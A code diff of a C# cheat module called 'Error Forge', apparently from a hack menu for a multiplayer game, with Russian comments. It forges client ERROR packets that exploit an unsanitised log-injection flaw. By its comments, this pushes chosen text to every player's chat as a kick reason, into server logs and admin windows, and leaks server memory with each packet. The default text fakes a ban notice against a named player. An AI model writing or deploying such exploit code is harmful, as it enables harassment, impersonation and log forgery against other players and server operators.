@@ -17,10 +17,20 @@
 //      текст длиннее       → режем на 16, между кусками будет ", "
 //    >16 симв. в строке = честный кик ("malformed error data") — не шлём.
 //
-//  УСЛОВИЯ: инъекция работает при GameStarted (нужен запущенный раунд —
-//  иначе хвост про сабы не формируется). 80 символов максимум за пакет.
-//  Каждый пакет с уникальным eventID вечно живёт в GameAnalytics HashSet
-//  (побочная утечка, ~100B/пакет).
+//  ★★ ГЛАВНОЕ (вскрыто полевым тестом юзера, волна 720): хвост HandleClientError
+//  ВСЕГДА кикает отправителя, и причина кика БРОАДКАСТИТСЯ ВСЕМ ИГРОКАМ В ЧАТ:
+//    DisconnectClient → SendChatMessage(peerDisconnectPacket.ChatMessage(name))
+//    → "ServerMessage.KickedFromServer [client=X] ... Причина: <errorStr С НАШИМ ТЕКСТОМ>"
+//  ИТОГ ОДНОГО ПАКЕТА (цена = твой дисконнект):
+//    1. текст ВСЕМ игрокам в общий чат (как причина кика)
+//    2. текст в консоль сервера (красный Error) + файл лога
+//    3. текст в окна клиентов с пермом ServerLog (админы)
+//    4. отдельный файл event_error_log_server_<имя>_<время>.log на сервере
+//    5. запись в GameAnalytics HashSet (вечная, ~100B)
+//  КИК НЕ ОТКЛЮЧИТЬ (безусловный хвост хендлера) — это дизайн "ошибся = рассинхрон = пока".
+//  БОНУС-ФАКТ: ERROR от ОУНЕРСКОГО соединения (хост) → EndGame(wasSaved:false) —
+//  раунд умирает без сейва (недостижимо нам, мы не оунер; задокументировано).
+//  80 символов максимум за пакет. GameStarted обязателен (иначе хвост с 'client:' не собирается).
 // ============================================================================
 
 using System;
@@ -35,16 +45,15 @@ namespace CSHUB.Modules
         public override string Id   => "error_forge";
         public override string Name => "Error Forge";
         public override string Description =>
-            "Type ANY text -> it gets written into the SERVER log/console and admin log windows " +
-            "via ERROR packets (CWE-117, no sanitization). No perms, no kicks, no strikes. " +
-            "16 chars = clean line, up to 80 = chunked with ', ' separators.";
+            "Type ANY text -> EVERY player sees it in chat as YOUR kick reason + server console/log " +
+            "+ admin log windows + dedicated .log file on the server (CWE-117, no sanitization). " +
+            "You WILL be disconnected (hardwired by design) - reconnect and repeat. 16 chars = clean line.";
         public override string Category => "exploit";
 
         public override string GetLabel() => "Error Forge 📜";
 
         private static GUIMessageBox _box;
         private static GUITextBox _textBox;
-        private static GUITextBox _repeatBox;
         private static GUITextBlock _status;
 
         public override void OnClick()
@@ -71,9 +80,12 @@ namespace CSHUB.Modules
             content.ClearChildren();
 
             new GUITextBlock(
-                new RectTransform(new Vector2(0.97f, 0.22f), content.RectTransform),
-                "Твой текст пишется В ЛОГ СЕРВЕРА (консоль + файл + админские окна):\n" +
-                "\"...has reported an error: ... don't match (client: ТВОЙ ТЕКСТ, server: ...)\"",
+                new RectTransform(new Vector2(0.97f, 0.34f), content.RectTransform),
+                "Твой текст УЛЕТИТ:\n" +
+                "1) ВСЕМ ИГРОКАМ В ЧАТ — как причина твоего кика\n" +
+                "2) в консоль+файл лога сервера (красный Error)\n" +
+                "3) в окна админов (перм ServerLog)\n" +
+                "⚠ ТЕБЯ КИКНЕТ после отправки (так устроен сервер) — просто перезайди",
                 textAlignment: Alignment.CenterLeft, wrap: true, font: GUIStyle.SmallFont)
             { TextColor = new Color(255, 170, 120) };
 
@@ -90,22 +102,10 @@ namespace CSHUB.Modules
                 new RectTransform(new Vector2(0.78f, 1f), textRow.RectTransform),
                 "BAN: SKYLEIOTIC (CHEATS)");
 
-            // --- повторы ---
-            var repRow = new GUILayoutGroup(
-                new RectTransform(new Vector2(0.97f, 0.13f), content.RectTransform),
-                isHorizontal: true);
-            repRow.RelativeSpacing = 0.01f;
-
             new GUITextBlock(
-                new RectTransform(new Vector2(0.22f, 1f), repRow.RectTransform),
-                "Повторов:", textAlignment: Alignment.CenterRight);
-            _repeatBox = new GUITextBox(
-                new RectTransform(new Vector2(0.2f, 1f), repRow.RectTransform),
-                "3");
-
-            new GUITextBlock(
-                new RectTransform(new Vector2(0.56f, 1f), repRow.RectTransform),
-                "(≤16 симв = чисто; длиннее = с ', '", font: GUIStyle.SmallFont)
+                new RectTransform(new Vector2(0.97f, 0.1f), content.RectTransform),
+                "(≤16 символов = чистый текст без мусора; длиннее = чанки через ', ')",
+                font: GUIStyle.SmallFont)
             { CanBeFocused = false, TextColor = Color.Gray };
 
             // --- кнопка ОТПРАВИТЬ ---
@@ -115,7 +115,7 @@ namespace CSHUB.Modules
             sendBtn.Color = new Color(180, 70, 50);
             sendBtn.OnClicked = (b, d) =>
             {
-                Forge(_textBox?.Text ?? "", GetRepeats());
+                Forge(_textBox?.Text ?? "");
                 return true;
             };
 
@@ -147,13 +147,7 @@ namespace CSHUB.Modules
             };
         }
 
-        private static int GetRepeats()
-        {
-            if (_repeatBox == null || !int.TryParse(_repeatBox.Text?.Trim(), out int n)) { return 3; }
-            return n < 1 ? 1 : (n > 30 ? 30 : n);
-        }
-
-        private static void Forge(string line, int repeats)
+        private static void Forge(string line)
         {
             if (GameMain.Client?.ClientPeer == null)
             {
@@ -186,33 +180,27 @@ namespace CSHUB.Modules
                 chunks[i] = line.Substring(i * 16, len);
             }
 
-            int sent = 0;
-            ushort evId = (ushort)new Random().Next(0, 65535);
-            for (int r = 0; r < repeats; r++)
+            try
             {
-                try
-                {
-                    var msg = new WriteOnlyMessage();
-                    msg.WriteByte((byte)ClientPacketHeader.ERROR);
-                    msg.WriteByte(1); // ClientNetError.MISSING_ENTITY (internal — литерал)
-                    msg.WriteUInt16((ushort)(evId + r)); // уникальный → +утечка в GameAnalytics
-                    msg.WriteUInt16(0);                  // entityID=0 → "entity that doesn't exist"
-                    msg.WriteByte((byte)chunkCount);
-                    for (int i = 0; i < chunkCount; i++) { msg.WriteString(chunks[i]); }
-                    GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                    sent++;
-                }
-                catch (Exception e)
-                {
-                    GUI.AddMessage("[ErrorForge] fail: " + e.Message, Color.Red);
-                    break;
-                }
+                var msg = new WriteOnlyMessage();
+                msg.WriteByte((byte)ClientPacketHeader.ERROR);
+                msg.WriteByte(1); // ClientNetError.MISSING_ENTITY (internal — литерал)
+                msg.WriteUInt16((ushort)new Random().Next(0, 65535)); // уникальный → утечка в GameAnalytics
+                msg.WriteUInt16(0);                  // entityID=0 → "entity that doesn't exist"
+                msg.WriteByte((byte)chunkCount);
+                for (int i = 0; i < chunkCount; i++) { msg.WriteString(chunks[i]); }
+                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            }
+            catch (Exception e)
+            {
+                GUI.AddMessage("[ErrorForge] fail: " + e.Message, Color.Red);
+                return;
             }
 
             string mode = clean ? "ЧИСТО (1 чанк)" : "чанки через ', '";
-            string result = $"[ErrorForge] {sent}× отправлено ({mode}): \"{line}\"";
+            string result = $"[ErrorForge] отправлено ({mode}): \"{line}\" — всех увидят в чате как причину кика, тебя сейчас отключит";
             if (_status != null) { _status.Text = "→ " + result; }
-            GUI.AddMessage(result + " — смотри консоль СЕРВЕРА.", Color.OrangeRed);
+            GUI.AddMessage(result, Color.OrangeRed);
         }
     }
 }
